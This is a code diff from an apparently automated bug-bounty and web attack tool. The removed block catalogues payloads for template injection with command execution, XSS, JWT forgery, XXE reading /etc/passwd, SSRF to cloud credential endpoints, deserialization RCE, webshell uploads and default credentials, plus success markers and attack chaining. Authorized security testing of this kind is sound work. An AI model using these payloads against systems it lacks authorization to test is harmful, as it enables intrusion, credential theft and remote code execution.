-                    "{{lipsum.__globals__[\'os\'].popen(\'id\').read()}}",
-                    "{% for x in ().__class__.__base__.__subclasses__() %}{{x.__name__}}{% endfor %}",
-                    "{%import os%}{{os.popen(\'id\').read()}}",
-                    "#set($x = 7 * 7)$x",
-                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-                    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
-                    "<%= 7*7 %>", "<%= system(\"id\") %>",
-                    "<%= `id` %>",
-                    "${7*7}", "#{7*7}",
-                    "T(java.lang.Runtime).getRuntime().exec(\'id\')",
-                    "${T(java.lang.System).getenv()}",
-                    "{php}echo `id`;{/php}", "{system(\'id\')}",
-                    "${__import__(\'os\').popen(\'id\').read()}",
-                ],
-                indicators=["template", "render", "name", "message", "content", "preview", "bio", "comment"],
-                success_markers=[
-                    r"(?<!\{)49(?!\})",
-                    r"uid=\d+", r"gid=\d+",
-                    r"<class \'", r"__class__",
-                    r"SECRET_KEY", r"DEBUG",
-                    r"root:x:", r"www-data",
-                    r"freemarker\.", r"java\.lang",
-                ],
-                failure_markers=[r"\{\{7\*7\}\}", r"\$\{7\*7\}"],
-                followups=["ssti_rce"]
-            ),
-            Attack(
-                name="xss_reflected",
-                category="injection",
-                payloads=[
-                    "<script>alert(1)</script>",
-                    "'\"><script>alert(1)</script>",
-                    "<script>alert(String.fromCharCode(88,83,83))</script>",
-                    "<img src=x onerror=alert(1)>",
-                    "<svg onload=alert(1)>",
-                    "<svg/onload=alert(1)>",
-                    "<body onload=alert(1)>",
-                    "<input onfocus=alert(1) autofocus>",
-                    "<marquee onstart=alert(1)>",
-                    "<video src=x onerror=alert(1)>",
-                    "<audio src=x onerror=alert(1)>",
-                    "<details open ontoggle=alert(1)>",
-                    "<iframe onload=alert(1)>",
-                    "\" onmouseover=\"alert(1)",
-                    "' onfocus='alert(1)' autofocus='",
-                    "\" autofocus onfocus=\"alert(1)",
-                    "' onclick='alert(1)'",
-                    "javascript:alert(1)",
-                    "data:text/html,<script>alert(1)</script>",
-                    "javascript:alert(document.domain)",
-                    "<scr<script>ipt>alert(1)</script>",
-                    "<SCRIPT>alert(1)</SCRIPT>",
-                    "<ScRiPt>alert(1)</ScRiPt>",
-                    "<script>alert`1`</script>",
-                    "<script>alert(1)//",
-                    "<img src=x onerror=alert`1`>",
-                    "%3Cscript%3Ealert(1)%3C/script%3E",
-                    "&#60;script&#62;alert(1)&#60;/script&#62;",
-                    "${alert(1)}",
-                    "{{constructor.constructor('return this')()}}",
-                    "'\"><img src=x onerror=alert(1)//",
-                ],
-                indicators=["search", "q", "query", "name", "message", "error", "redirect", "url", "ref", "callback"],
-                success_markers=[
-                    r"<script>alert\(1\)</script>",
-                    r"onerror\s*=\s*alert",
-                    r"onload\s*=\s*alert",
-                    r"onfocus\s*=\s*alert",
-                    r"onmouseover\s*=\s*alert",
-                    r"onclick\s*=\s*alert",
-                    r"ontoggle\s*=\s*alert",
-                    r"javascript:alert",
-                    r"<svg[^>]*onload",
-                    r"<img[^>]*onerror",
-                ],
-                failure_markers=[r"&lt;script", "blocked", "rejected"],
-                followups=["xss_stored"]
-            ),
-            
-            # === AUTH ===
-            Attack(
-                name="auth_bypass_cookie",
-                category="auth",
-                payloads=["admin=1", "loggedin=1", "authenticated=true", "role=admin"],
-                indicators=["login", "auth", "session", "admin"],
-                success_markers=["welcome", "dashboard", "admin", "logout"],
-                failure_markers=["denied", "unauthorized", "login"],
-                followups=["priv_esc"]
-            ),
-            Attack(
-                name="auth_bypass_header",
-                category="auth",
-                payloads=[
-                    "X-Forwarded-For: 127.0.0.1",
-                    "X-Real-IP: 127.0.0.1",
-                    "X-Original-URL: /admin"
-                ],
-                indicators=["admin", "internal", "localhost"],
-                success_markers=["admin", "dashboard", "config"],
-                failure_markers=["forbidden", "denied"],
-                followups=["priv_esc"]
-            ),
-            Attack(
-                name="default_creds",
-                category="auth",
-                payloads=[
-                    "admin:admin", "admin:password", "admin:123456",
-                    "root:root", "test:test", "guest:guest"
-                ],
-                indicators=["login", "username", "password"],
-                success_markers=["welcome", "dashboard", "success"],
-                failure_markers=["invalid", "incorrect", "failed"],
-                followups=["post_auth_enum"]
-            ),
-            
-            # === FILE ===
-            Attack(
-                name="webdav_put",
-                category="file",
-                payloads=["PUT /dav/test.txt", "PUT /uploads/test.txt"],
-                indicators=["dav", "webdav", "DAV"],
-                success_markers=["201", "204", "Created"],
-                failure_markers=["405", "403", "Method Not Allowed"],
-                followups=["webshell_upload"]
-            ),
-            Attack(
-                name="file_upload",
-                category="file",
-                payloads=["shell.php", "shell.php.jpg", "shell.phtml", ".htaccess"],
-                indicators=["upload", "file", "attach", "image"],
-                success_markers=["uploaded", "success"],
-                failure_markers=["invalid", "not allowed", "blocked"],
-                followups=["webshell_exec"]
-            ),
-
-            # === NEW ATTACK TYPES (v2.3) ===
-
-            Attack(
-                name="jwt_none_alg",
-                category="auth",
-                payloads=[
-                    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
-                    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
-                    "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
-                ],
-                indicators=["jwt", "token", "bearer", "authorization", "auth"],
-                success_markers=["admin", "dashboard", "welcome", "role.*admin", "authenticated"],
-                failure_markers=["invalid token", "unauthorized", "expired", "signature"],
-                followups=["idor_enum"]
-            ),
-            Attack(
-                name="jwt_weak_secret",
-                category="auth",
-                payloads=[
-                    "secret", "password", "123456", "key", "jwt_secret",
-                    "changeme", "test", "admin", "your-256-bit-secret",
-                ],
-                indicators=["jwt", "token", "bearer", "authorization"],
-                success_markers=["admin", "dashboard", "role", "authenticated"],
-                failure_markers=["invalid", "unauthorized", "signature"],
-                followups=["jwt_none_alg"]
-            ),
-            Attack(
-                name="idor_enum",
-                category="auth",
-                payloads=[
-                    "1", "2", "3", "100", "1000", "0", "-1",
-                    "admin", "test", "user",
-                    "../1", "../admin",
-                ],
-                indicators=["id", "user_id", "uid", "account", "profile", "order", "doc", "invoice", "file_id", "msg"],
-                success_markers=[
-                    r"\"name\"", r"\"email\"", r"\"user\"", r"\"username\"",
-                    r"\"phone\"", r"\"address\"", r"\"order\"",
-                    r"profile", r"account",
-                ],
-                failure_markers=["not found", "unauthorized", "forbidden", "no access"],
-                followups=["idor_enum"]
-            ),
-            Attack(
-                name="debug_endpoints",
-                category="recon",
-                payloads=[
-                    "/debug", "/debug/vars", "/debug/pprof/",
-                    "/_debug", "/server-status", "/server-info",
-                    "/elmah.axd", "/trace.axd",
-                    "/actuator", "/actuator/env", "/actuator/health",
-                    "/actuator/mappings", "/actuator/configprops",
-                    "/actuator/beans", "/actuator/heapdump",
-                    "/console", "/admin/console",
-                    "/__debug__/", "/phpinfo.php",
-                    "/info", "/health", "/metrics",
-                    "/swagger.json", "/swagger-ui.html",
-                    "/api-docs", "/v2/api-docs", "/v3/api-docs",
-                    "/_profiler/", "/silk/",
-                    "/graphiql", "/altair",
-                ],
-                indicators=["http"],
-                success_markers=[
-                    r"phpinfo\(\)", r"PHP Version", r"System.*Linux",
-                    r"DOCUMENT_ROOT", r"SERVER_SOFTWARE",
-                    r"\"status\".*\"UP\"", r"\"health\"",
-                    r"server-status", r"Apache Server",
-                    r"pprof", r"goroutine", r"heap",
-                    r"swagger", r"openapi", r"\"paths\"",
-                    r"actuator", r"configprops", r"beans",
-                    r"debug.*vars", r"memstats",
-                    r"graphiql", r"GraphQL",
-                ],
-                failure_markers=["404", "Not Found", "403"],
-                followups=["env_file", "source_maps"]
-            ),
-            Attack(
-                name="source_maps",
-                category="recon",
-                payloads=[
-                    "/main.js.map", "/app.js.map", "/bundle.js.map",
-                    "/vendor.js.map", "/runtime.js.map", "/chunk.js.map",
-                    "/static/js/main.js.map", "/static/js/bundle.js.map",
-                    "/assets/index.js.map", "/dist/main.js.map",
-                    "/build/static/js/main.chunk.js.map",
-                    "/webpack.config.js", "/.webpack/",
-                ],
-                indicators=["http", "js", "react", "angular", "vue", "webpack"],
-                success_markers=[
-                    r"\"version\"\s*:\s*3", r"\"sources\"", r"\"mappings\"",
-                    r"\"sourcesContent\"", r"\"file\"",
-                    r"webpack://", r"module\.exports",
-                ],
-                failure_markers=["404", "Not Found"],
-                followups=["env_file"]
-            ),
-            Attack(
-                name="graphql_introspection",
-                category="recon",
-                payloads=[
-                    '{"query":"{ __schema { types { name fields { name } } } }"}',
-                    '{"query":"{ __schema { queryType { name } mutationType { name } } }"}',
-                    '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
-                    '{"query":"query IntrospectionQuery { __schema { types { name kind description fields(includeDeprecated: true) { name } } } }"}',
-                ],
-                indicators=["graphql", "gql", "query", "mutation", "api"],
-                success_markers=[
-                    r"__schema", r"__type", r"\"types\"",
-                    r"\"queryType\"", r"\"mutationType\"",
-                    r"\"fields\"", r"\"name\".*\"kind\"",
-                ],
-                failure_markers=["introspection.*disabled", "not allowed", "forbidden"],
-                followups=["graphql_injection"]
-            ),
-            Attack(
-                name="graphql_injection",
-                category="injection",
-                payloads=[
-                    '{"query":"{ users { id email password } }"}',
-                    '{"query":"mutation { register(email:\\"test@test.com\\", password:\\"test\\") { token } }"}',
-                    '{"query":"{ user(id: 1) { email password apiKey } }"}',
-                    '{"query":"query { search(term: \\"\\\\\\") { id } }"}',
-                ],
-                indicators=["graphql", "gql", "query", "graphql_introspection"],
-                success_markers=[
-                    r"\"password\"", r"\"email\"", r"\"token\"",
-                    r"\"apiKey\"", r"\"secret\"",
-                    r"syntax error", r"Cannot query field",
-                ],
-                failure_markers=["forbidden", "unauthorized"],
-                followups=["sqli_error"]
-            ),
-            Attack(
-                name="xxe_basic",
-                category="injection",
-                payloads=[
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-                ],
-                indicators=["xml", "soap", "feed", "rss", "svg", "upload", "import"],
-                success_markers=[
-                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh",
-                    r"\[extensions\]", r"\[fonts\]",
-                    r"ami-id", r"instance-id",
-                ],
-                failure_markers=["parsing error", "not well-formed", "entities.*not allowed"],
-                followups=["ssrf_basic", "lfi_basic"]
-            ),
-            Attack(
-                name="crlf_injection",
-                category="injection",
-                payloads=[
-                    "%0d%0aSet-Cookie:viper=crlf",
-                    "%0d%0aX-Injected:viper-crlf-test",
-                    "%0d%0a%0d%0a<script>alert(1)</script>",
-                    "%E5%98%8A%E5%98%8DSet-Cookie:viper=crlf",
-                    "%0d%0aLocation:https://evil.com",
-                    "%0aX-Injected:viper",
-                    "%0dX-Injected:viper",
-                ],
-                indicators=["redirect", "url", "next", "return", "goto", "callback", "header"],
-                success_markers=[
-                    r"Set-Cookie.*viper=crlf",
-                    r"X-Injected.*viper",
-                    r"viper-crlf-test",
-                ],
-                failure_markers=["blocked", "invalid"],
-                followups=["xss_reflected", "open_redirect_basic"]
-            ),
-            Attack(
-                name="host_header_injection",
-                category="injection",
-                payloads=[
-                    "evil.com", "evil.com:80", "evil.com%00original.com",
-                    "localhost", "127.0.0.1",
-                ],
-                indicators=["http", "host", "password", "reset", "forgot", "email"],
-                success_markers=[
-                    r"evil\.com", r"localhost.*reset",
-                    r"127\.0\.0\.1.*link", r"password.*reset.*evil",
-                    r"<a[^>]*evil\.com",
-                ],
-                failure_markers=["invalid host", "not recognized"],
-                followups=["open_redirect_basic"]
-            ),
-            Attack(
-                name="subdomain_takeover",
-                category="recon",
-                payloads=[
-                    "NXDOMAIN", "NoSuchBucket",
-                    "There isn't a GitHub Pages site here",
-                    "herokucdn.com", "herokuapp.com",
-                    "The specified bucket does not exist",
-                    "Repository not found", "No such app",
-                    "PROJECT_NOT_FOUND",
-                    "Fastly error: unknown domain",
-                    "Help Center Closed",
-                ],
-                indicators=["http", "subdomain", "cname"],
-                success_markers=[
-                    r"NoSuchBucket", r"NXDOMAIN",
-                    r"There isn't a GitHub Pages",
-                    r"No such app", r"unknown domain",
-                    r"The specified bucket does not exist",
-                ],
-                failure_markers=["200 OK"],
-                followups=[]
-            ),
-            Attack(
-                name="verb_tampering",
-                category="auth",
-                payloads=["PATCH", "DELETE", "PUT", "TRACE", "OPTIONS", "CONNECT", "PROPFIND"],
-                indicators=["admin", "api", "rest", "delete", "update", "edit"],
-                success_markers=[
-                    r"admin", r"dashboard", r"deleted", r"updated",
-                    r"TRACE.*HTTP",
-                    r"Allow:.*PUT", r"Allow:.*DELETE",
-                ],
-                failure_markers=["Method Not Allowed", "405", "403"],
-                followups=["auth_bypass_header"]
-            ),
-            Attack(
-                name="open_redirect_basic",
-                category="injection",
-                payloads=[
-                    "https://evil.com", "//evil.com", "/\\evil.com",
-                    "https://evil.com%00.target.com",
-                    "https://evil.com?.target.com",
-                    "https://evil.com@target.com",
-                    "////evil.com", "https:evil.com",
-                    "//evil%E3%80%82com",
-                ],
-                indicators=["redirect", "url", "next", "return", "goto", "continue", "dest", "redir", "callback", "forward"],
-                success_markers=[
-                    r"Location.*evil\.com",
-                    r"window\.location.*evil",
-                    r"meta.*refresh.*evil",
-                ],
-                failure_markers=["blocked", "invalid url", "not allowed"],
-                followups=["xss_reflected"]
-            ),
-            Attack(
-                name="cors_check",
-                category="misc",
-                payloads=[
-                    "Origin: https://evil.com",
-                    "Origin: null",
-                    "Origin: https://target.com.evil.com",
-                ],
-                indicators=["http", "api", "json", "rest"],
-                success_markers=[
-                    r"Access-Control-Allow-Origin.*evil",
-                    r"Access-Control-Allow-Origin.*null",
-                    r"Access-Control-Allow-Credentials.*true",
-                ],
-                failure_markers=[],
-                followups=[]
-            ),
-            Attack(
-                name="cache_poisoning",
-                category="injection",
-                payloads=[
-                    "X-Forwarded-Host: evil.com",
-                    "X-Forwarded-Scheme: nothttps",
-                    "X-Original-URL: /admin",
-                    "X-Rewrite-URL: /admin",
-                    "X-Host: evil.com",
-                ],
-                indicators=["http", "cdn", "cache", "cloudflare", "akamai", "fastly", "varnish"],
-                success_markers=[
-                    r"evil\.com", r"/admin",
-                    r"X-Cache.*HIT", r"Age:\s*\d+",
-                ],
-                failure_markers=["blocked", "forbidden"],
-                followups=["xss_reflected"]
-            ),
-            Attack(
-                name="prototype_pollution",
-                category="injection",
-                payloads=[
-                    "__proto__[polluted]=true",
-                    "constructor[prototype][polluted]=true",
-                    "__proto__.polluted=true",
-                    '{"__proto__":{"polluted":"true"}}',
-                    "__proto__[isAdmin]=true",
-                ],
-                indicators=["json", "merge", "extend", "assign", "node", "express", "javascript"],
-                success_markers=[
-                    r"polluted.*true", r"isAdmin.*true",
-                    r"\"polluted\"", r"prototype",
-                ],
-                failure_markers=["invalid", "blocked"],
-                followups=["xss_reflected"]
-            ),
-            Attack(
-                name="insecure_deserialization",
-                category="injection",
-                payloads=[
-                    "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg==",
-                    'O:8:"stdClass":1:{s:4:"test";s:5:"viper";}',
-                    'a:1:{s:4:"test";s:5:"viper";}',
-                    "gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
-                    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
-                ],
-                indicators=["serialize", "object", "viewstate", "pickle", "marshal", "java", "base64", "cookie"],
-                success_markers=[
-                    r"uid=\d+", r"root:", r"www-data",
-                    r"ClassNotFoundException", r"java\.io",
-                    r"unserialize", r"__wakeup",
-                    r"unpickle", r"pickle",
-                ],
-                failure_markers=["invalid", "blocked", "deserialization.*error"],
-                followups=["cmdi_basic"]
-            ),
-            Attack(
-                name="ssrf_basic",
-                category="injection",
-                payloads=[
-                    "http://169.254.169.254/latest/meta-data/",
-                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                    "http://metadata.google.internal/computeMetadata/v1/",
-                    "http://100.100.100.200/latest/meta-data/",
-                    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
-                    "http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
-                    "http://localhost:8080/", "http://localhost:9200/",
-                    "http://[::1]/", "http://0x7f000001/",
-                    "file:///etc/passwd", "file:///etc/hostname",
-                    "gopher://127.0.0.1:6379/_INFO",
-                    "dict://127.0.0.1:6379/info",
-                ],
-                indicators=["url", "uri", "src", "href", "fetch", "load", "proxy", "forward", "request", "link", "webhook"],
-                success_markers=[
-                    r"ami-id", r"instance-id", r"security-credentials",
-                    r"computeMetadata", r"access_token",
-                    r"root:x?:\d+:\d+", r"SSH-\d+",
-                    r"redis_version", r"MongoDB",
-                    r"elasticsearch",
-                ],
-                failure_markers=["blocked", "not allowed", "invalid url", "SSRF"],
-                followups=["lfi_basic"]
-            ),
-            Attack(
-                name="request_smuggling",
-                category="injection",
-                payloads=[
-                    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
-                    "Content-Length: 0\r\nTransfer-Encoding: chunked",
-                    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
-                ],
-                indicators=["http", "proxy", "cdn", "load balancer", "nginx", "haproxy"],
-                success_markers=[
-                    r"admin", r"smuggled",
-                    r"two responses", r"desync",
-                ],
-                failure_markers=["400 Bad Request", "blocked"],
-                followups=["auth_bypass_header"]
-            ),
-        ]
-
-        for attack in attacks_data:
-            self.attacks[attack.name] = attack
-
-        # Extend payloads from wordlist files if available
-        wordlist_map = {
-            "lfi_basic": "lfi-payloads.txt",
-        }
-        wordlists_dir = Path(__file__).parent / "wordlists"
-        for attack_name, wl_file in wordlist_map.items():
-            wl_path = wordlists_dir / wl_file
-            if wl_path.exists() and attack_name in self.attacks:
-                extra = [
-                    line.strip()
-                    for line in wl_path.read_text(errors="ignore").splitlines()
-                    if line.strip() and not line.startswith("#")
-                ]
-                existing = set(self.attacks[attack_name].payloads)
-                self.attacks[attack_name].payloads.extend(
-                    p for p in extra if p not in existing
-                )
-
-        # Tech signatures
-        self.tech_signatures = {
-            "php": ["php", "<?php", ".php", "PHPSESSID"],
-            "asp": [".asp", ".aspx", "ASP.NET", "__VIEWSTATE"],
-            "java": [".jsp", ".do", "JSESSIONID", "java", "tomcat"],
-            "python": ["python", "django", "flask", "werkzeug"],
-            "node": ["express", "node", "npm"],
-            "wordpress": ["wp-content", "wp-includes", "wordpress"],
-            "nginx": ["nginx"],
-            "apache": ["apache", "httpd"],
-            "iis": ["iis", "asp.net"],
-        }
-    
-    def _load(self):
-        """Load saved knowledge"""
-        if KNOWLEDGE_FILE.exists():
-            try:
-                data = json.loads(KNOWLEDGE_FILE.read_text())
-                for name, stats in data.get("attack_stats", {}).items():
-                    if name in self.attacks:
-                        self.attacks[name].attempts = stats.get("attempts", 0)
-                        self.attacks[name].successes = stats.get("successes", 0)
-                self.successful_chains = data.get("successful_chains", [])
-                self.target_history = data.get("target_history", {})
-            except:
-                pass
-    
-    def save(self):
-        """Save knowledge"""
-        data = {
-            "attack_stats": {
-                name: {"attempts": a.attempts, "successes": a.successes}
-                for name, a in self.attacks.items()
-            },
-            "successful_chains": self.successful_chains[-100:],
-            "target_history": dict(list(self.target_history.items())[-500:])
-        }
-        KNOWLEDGE_FILE.write_text(json.dumps(data, indent=2))
-    
-    def get_attacks_for_context(self, target: Target) -> List[str]:
-        """Get relevant attacks for this target"""
-        relevant = []
-        
-        url_lower = target.url.lower()
-        techs = " ".join(target.technologies).lower()
-        params = " ".join(target.parameters).lower()
-        context = f"{url_lower} {techs} {params}"
-        
-        for name, attack in self.attacks.items():
-            if not target.should_try_attack(name):
-                continue
-            
-            for indicator in attack.indicators:
-                if indicator.lower() in context:
-                    relevant.append(name)
-                    break
-        
-        relevant.sort(key=lambda n: self.attacks[n].success_rate, reverse=True)
-        
-        return relevant
-    
-    def get_followup_attacks(self, successful_attack: str) -> List[str]:
-        """Get what to try next after a successful attack"""
-        attack = self.attacks.get(successful_attack)
-        if attack:
-            return attack.followups
-        return []
-    
-    def record_result(self, attack_name: str, success: bool, target_url: str):
-        """Record attack result for learning"""
-        if attack_name in self.attacks:
-            self.attacks[attack_name].attempts += 1
-            if success:
-                self.attacks[attack_name].successes += 1
-    
-    def detect_technologies(self, content: str, headers: Dict) -> Set[str]:
-        """Detect technologies from response"""
-        techs = set()
-        combined = f"{content} {json.dumps(headers)}".lower()
-        
-        for tech, signatures in self.tech_signatures.items():
-            for sig in signatures:
-                if sig.lower() in combined:
-                    techs.add(tech)
-                    break
-        
-        return techs
+# ── Backward-compatible name bindings ──
+# ViperCore.__init__ uses bare class names; bind them from the loader.
+ReconEngine = _ml.get("ReconEngine")
+SurfaceMapper = _ml.get("SurfaceMapper")
+NucleiScanner = _ml.get("NucleiScanner")
+LLMAnalyzer = _ml.get("LLMAnalyzer")
+ScopeManager = _ml.get("ScopeManager")
+BugBountyScope = _ml.get("BugBountyScope")
+ScopeViolationError = _ml.get("ScopeViolationError")
+ToolManager = _ml.get("ToolManager")
+HackerHTTPClient = _ml.get("HackerHTTPClient")
+RequestResult = _ml.get("RequestResult")
+ViperDB = _ml.get("ViperDB")
+FindingValidator = _ml.get("FindingValidator")
+PoCGenerator = _ml.get("PoCGenerator")
+SmartFuzzer = _ml.get("SmartFuzzer")
+GrammarFuzzer = _ml.get("GrammarFuzzer")
+PayloadMutator = _ml.get("PayloadMutator")
+EvoGraph = _ml.get("EvoGraph")
+SecretScanner = _ml.get("SecretScanner")
+StealthEngine = _ml.get("StealthEngine")
+PhaseEngine = _ml.get("PhaseEngine")
+Phase = _ml.get("Phase")
+AttackGraph = _ml.get("AttackGraph")
+WebCrawler = _ml.get("WebCrawler")
+TargetGuardrail = _ml.get("TargetGuardrail")
+InputSanitizer = _ml.get("InputSanitizer")
+BruteForcer = _ml.get("BruteForcer")
+MetasploitClient = _ml.get("MetasploitClient")
+CodeFixAgent = _ml.get("CodeFixAgent")
+PostExploitAgent = _ml.get("PostExploitAgent")
+GraphEngine = _ml.get("GraphEngine")
+ChainWriter = _ml.get("ChainWriter")
+GraphQueryEngine = _ml.get("GraphQueryEngine")
+ViperOrchestrator = _ml.get("ViperOrchestrator")
+ThinkEngine = _ml.get("ThinkEngine")
+Wappalyzer = _ml.get("Wappalyzer")
+MitreEnricher = _ml.get("MitreEnricher")
+SettingsManager = _ml.get("SettingsManager")
+MCPToolInterface = _ml.get("MCPToolInterface")
+GVMScanner = _ml.get("GVMScanner")
+ReconPipeline = _ml.get("ReconPipeline")
+OAuthFuzzer = _ml.get("OAuthFuzzer")
+WebSocketFuzzer = _ml.get("WebSocketFuzzer")
+RaceEngine = _ml.get("RaceEngine")
+LogicModeler = _ml.get("LogicModeler")
+FailureAnalyzer = _ml.get("FailureAnalyzer")
+CrossTargetCorrelator = _ml.get("CrossTargetCorrelator")
+GeneticFuzzer = _ml.get("GeneticFuzzer")
+FingerprintRandomizer = _ml.get("FingerprintRandomizer")
+HumanTimingProfile = _ml.get("HumanTimingProfile")
+ChainOfCustody = _ml.get("ChainOfCustody")
+FindingStream = _ml.get("FindingStream")
+NotificationConfig = _ml.get("NotificationConfig")
+ReportNarrative = _ml.get("ReportNarrative")
+ReportExporter = _ml.get("ReportExporter")
+_generate_html_report = _ml.get("generate_report")
+_save_html_report = _ml.get("save_report")
+_enrich_compliance = _ml.get("enrich_finding")
+format_compliance_section = _ml.get("format_compliance_section")
+enrich_finding_mitre = _ml.get("enrich_finding_mitre")
+get_attack_narrative = _ml.get("get_attack_narrative")
+classify_attack = _ml.get("classify_attack")
+get_skill_prompt = _ml.get("get_skill_prompt")
+hard_guardrail_check = _ml.get("is_blocked")
+llm_guardrail_check = _ml.get("check_target_allowed")
+TriageEngine = _ml.get("TriageEngine")
+run_triage_queries = _ml.get("run_triage_queries")
+shodan_enrich = _ml.get("enrich_ip_sync")
+CvssV4Score = _ml.get("CvssV4Score")
+calculate_cvss4 = _ml.get("calculate_cvss4")
 
 
 class ViperCore:
@@ -1387,11 +366,8 @@ class ViperCore:
         else:
             self.secret_scanner = None
 
-        # Notifier (Telegram alerts via Clawdbot)
+        # Notifier — consolidated into FindingStream
         self.notifier = None
-        if NOTIFIER_AVAILABLE:
-            self.notifier = Notifier(gateway_url="http://localhost:1999", enabled=True)
-            self.log("[Notifier] Telegram alerts enabled via Clawdbot gateway")
 
         # Initialize modules
         if MODULES_AVAILABLE:
@@ -1420,8 +396,19 @@ class ViperCore:
                 try:
                     from viper_brain import ViperBrain
                     self._brain = ViperBrain()
-                except Exception:
-                    pass
+                except ImportError:
+                    try:
+                        import sys as _sys
+                        from pathlib import Path as _Path
+                        _archive = _Path(__file__).parent / "archive" / "old_entry_points"
+                        if _archive.exists() and str(_archive) not in _sys.path:
+                            _sys.path.insert(0, str(_archive))
+                        from viper_brain import ViperBrain
+                        self._brain = ViperBrain()
+                    except Exception as _e:
+                        self.log(f"[ViperBrain] Could not load: {_e}", "DEBUG")
+                except Exception as _e:
+                    self.log(f"[ViperBrain] Init failed: {_e}", "DEBUG")
                 if self._brain:
                     self._react_engine = ReACTEngine(
                         brain=self._brain,
@@ -1775,7 +762,7 @@ class ViperCore:
                          max_minutes: int = 30) -> Dict:
         """
         Execute full bug bounty hunting workflow.
-        
+
         Phases:
         1. Scope validation
         2. Reconnaissance
@@ -1784,29 +771,36 @@ class ViperCore:
         5. Manual attacks
         6. LLM analysis
         7. Report generation
+
+        Heavy logic is delegated to standalone functions in core.hunt_phases.
         """
+        from core.hunt_phases import (
+            phase_pipeline, phase_recon, phase_secrets, phase_surface,
+            phase_nuclei, phase_gvm, phase_manual_attacks, phase_llm_analysis,
+            phase_finalize,
+        )
+
         start_time = datetime.now()
         end_time = start_time + timedelta(minutes=max_minutes)
 
         # Per-phase time budgets (minutes): recon 20%, surface 20%, nuclei 10%, manual 50%
-        # Guarantee minimum 3 minutes for manual hunt
         manual_min = max(3.0, max_minutes * 0.5)
         remaining_budget = max_minutes - manual_min
-        recon_budget = remaining_budget * 0.4   # ~20% of total
-        surface_budget = remaining_budget * 0.4  # ~20% of total
-        nuclei_budget = remaining_budget * 0.2   # ~10% of total
+        recon_budget = remaining_budget * 0.4
+        surface_budget = remaining_budget * 0.4
+        nuclei_budget = remaining_budget * 0.2
 
         target = Target(url=target_url)
         self.current_target = target
         domain = self._extract_domain(target_url)
+        _full_hunt_session_start = datetime.now().isoformat()
 
-        # VIPER 4.0: Register target in knowledge graph
         if self.graph_engine:
             self.graph_engine.add_target(domain)
 
         self.log(f"=== VIPER Full Hunt: {target_url} ===")
         self.log(f"Time limit: {max_minutes} min (recon={recon_budget:.1f}, surface={surface_budget:.1f}, nuclei={nuclei_budget:.1f}, manual={manual_min:.1f})")
-        
+
         results = {
             "target": target_url,
             "start_time": start_time.isoformat(),
@@ -1815,8 +809,7 @@ class ViperCore:
             "nuclei_findings": [],
             "access_level": 0
         }
-        
-        # Start HackerHTTPClient if available
+
         if self.http_client:
             await self.http_client.start()
 
@@ -1824,7 +817,7 @@ class ViperCore:
             connector=aiohttp.TCPConnector(ssl=False)
         ) as self.session:
 
-            # Phase 1: Scope Check
+            # Phase 1: Scope Check (stays inline — trivial)
             if scope and self.scope_manager:
                 self.scope_manager.active_scope = scope
                 in_scope, reason = self.scope_manager.is_in_scope(target_url)
@@ -1832,376 +825,120 @@ class ViperCore:
                     self.log(f"Target out of scope: {reason}", "WARN")
                     results["error"] = f"Out of scope: {reason}"
                     return results
-            
-            # Phase 1.5: Recon Pipeline (runs full chain before individual phases)
+
+            # Phase 1.5: Recon Pipeline
             if PIPELINE_AVAILABLE and self.settings.get("use_recon_pipeline", True):
-                self.log("\n=== Phase 1.5: Recon Pipeline ===")
-                try:
-                    pipeline = ReconPipeline(
-                        graph_engine=self.graph_engine,
-                        session=self.session,
-                        settings=self.settings,
-                    )
-                    pipeline_budget = min(recon_budget * 60 * 0.5, 300)  # max 5 min
-                    recon_results = await asyncio.wait_for(
-                        pipeline.run(target, timeout_minutes=pipeline_budget / 60),
-                        timeout=pipeline_budget,
-                    )
-                    if recon_results.endpoints:
-                        self.log(f"[Pipeline] Discovered {len(recon_results.endpoints)} endpoints")
-                        # Merge pipeline endpoints into target
-                        for ep in recon_results.endpoints:
-                            target.technologies.add(ep) if hasattr(target, 'technologies') else None
-                    if recon_results.technologies:
-                        self.log(f"[Pipeline] Fingerprinted {len(recon_results.technologies)} technologies")
-                    if recon_results.subdomains:
-                        target.subdomains = target.subdomains | recon_results.subdomains if hasattr(target, 'subdomains') and target.subdomains else recon_results.subdomains
-                    results["phases"]["pipeline"] = recon_results.to_dict()
-                except asyncio.TimeoutError:
-                    self.log("[Pipeline] Timed out, falling back to standard recon", "WARN")
-                except Exception as e:
-                    self.log(f"[Pipeline] Error: {e}", "WARN")
